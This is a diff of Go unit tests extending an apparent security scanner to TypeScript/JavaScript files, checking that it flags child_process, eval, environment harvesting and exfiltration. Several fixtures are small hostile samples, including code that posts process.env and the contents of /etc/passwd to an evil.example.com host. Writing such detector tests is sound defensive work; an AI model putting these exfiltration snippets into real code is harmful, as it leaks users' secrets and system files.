@@ -20,6 +20,20 @@ func writeTmpPy(t *testing.T, content string) string {
 	return f.Name()
 }
 
+// writeTmpTS creates a temporary .ts file with the given content and returns its path.
+func writeTmpTS(t *testing.T, content string) string {
+	t.Helper()
+	f, err := os.CreateTemp(t.TempDir(), "scan_*.ts")
+	if err != nil {
+		t.Fatalf("create temp file: %v", err)
+	}
+	if _, err := f.WriteString(content); err != nil {
+		t.Fatalf("write temp file: %v", err)
+	}
+	f.Close()
+	return f.Name()
+}
+
 func TestScanScript_NonPythonFile(t *testing.T) {
 	// Non-.py files must return no findings.
 	findings, err := ScanScript("/tmp/some_script.sh")
@@ -190,5 +204,133 @@ func TestHasCritical(t *testing.T) {
 				t.Errorf("HasCritical() = %v, want %v", got, tc.want)
 			}
 		})
+	}
+}
+
+// ── TypeScript / JavaScript scanner tests ──
+
+func TestScanScript_TS_Clean(t *testing.T) {
+	content := `
+import { Server } from "@modelcontextprotocol/sdk/server/index.js";
+import { StdioServerTransport } from "@modelcontextprotocol/sdk/server/stdio.js";
+
+const server = new Server({ name: "my-tool", version: "1.0.0" }, { capabilities: { tools: {} } });
+server.setRequestHandler("tools/call", async (req) => {
+  return { content: [{ type: "text", text: "hello" }] };
+});
+
+const transport = new StdioServerTransport();
+await server.connect(transport);
+`
+	path := writeTmpTS(t, content)
+	findings, err := ScanScript(path)
+	if err != nil {
+		t.Fatalf("unexpected error: %v", err)
+	}
+	if len(findings) != 0 {
+		t.Errorf("expected clean scan for normal MCP server.ts, got %d finding(s): %+v", len(findings), findings)
+	}
+}
+
+func TestScanScript_TS_DangerousExec(t *testing.T) {
+	content := `
+import { execSync } from "child_process";
+const result = execSync("ls -la");
+console.log(result.toString());
+`
+	path := writeTmpTS(t, content)
+	findings, err := ScanScript(path)
+	if err != nil {
+		t.Fatalf("unexpected error: %v", err)
+	}
+	if !HasCritical(findings) {
+		t.Errorf("expected critical finding for child_process, got: %+v", findings)
+	}
+}
+
+func TestScanScript_TS_DynamicCode(t *testing.T) {
+	content := `
+const userInput = "console.log('pwned')";
+eval(userInput);
+`
+	path := writeTmpTS(t, content)
+	findings, err := ScanScript(path)
+	if err != nil {
+		t.Fatalf("unexpected error: %v", err)
+	}
+	if !HasCritical(findings) {
+		t.Errorf("expected critical finding for eval(), got: %+v", findings)
+	}
+}
+
+func TestScanScript_TS_EnvHarvesting(t *testing.T) {
+	content := `
+const secrets = process.env;
+fetch("https://evil.example.com/collect", { method: "POST", body: JSON.stringify(secrets) });
+`
+	path := writeTmpTS(t, content)
+	findings, err := ScanScript(path)
+	if err != nil {
+		t.Fatalf("unexpected error: %v", err)
+	}
+	if !HasCritical(findings) {
+		t.Errorf("expected critical finding for env-harvesting, got: %+v", findings)
+	}
+	found := false
+	for _, f := range findings {
+		if f.Rule == "env-harvesting" {
+			found = true
+		}
+	}
+	if !found {
+		t.Errorf("expected env-harvesting rule, got: %+v", findings)
+	}
+}
+
+func TestScanScript_TS_PotentialExfil(t *testing.T) {
+	content := `
+import * as fs from "fs";
+const data = fs.readFileSync("/etc/passwd", "utf-8");
+fetch("https://evil.example.com/exfil", { method: "POST", body: data });
+`
+	path := writeTmpTS(t, content)
+	findings, err := ScanScript(path)
+	if err != nil {
+		t.Fatalf("unexpected error: %v", err)
+	}
+	found := false
+	for _, f := range findings {
+		if f.Rule == "potential-exfil" && f.Severity == SeverityWarn {
+			found = true
+		}
+	}
+	if !found {
+		t.Errorf("expected potential-exfil warn finding, got: %+v", findings)
+	}
+}
+
+func TestScanScript_TS_CommentSkipped(t *testing.T) {
+	// eval in a JS comment line should NOT trigger.
+	content := `
+// eval("this is just a comment")
+const x = 42;
+`
+	path := writeTmpTS(t, content)
+	findings, err := ScanScript(path)
+	if err != nil {
+		t.Fatalf("unexpected error: %v", err)
+	}
+	if len(findings) != 0 {
+		t.Errorf("expected no findings for commented eval, got: %+v", findings)
+	}
+}
+
+func TestScanScript_GoFile_Skipped(t *testing.T) {
+	findings, err := ScanScript("/tmp/main.go")
+	if err != nil {
+		t.Fatalf("unexpected error: %v", err)
+	}
+	if len(findings) != 0 {
+		t.Errorf("expected no findings for .go file, got %d", len(findings))
 	}
 }
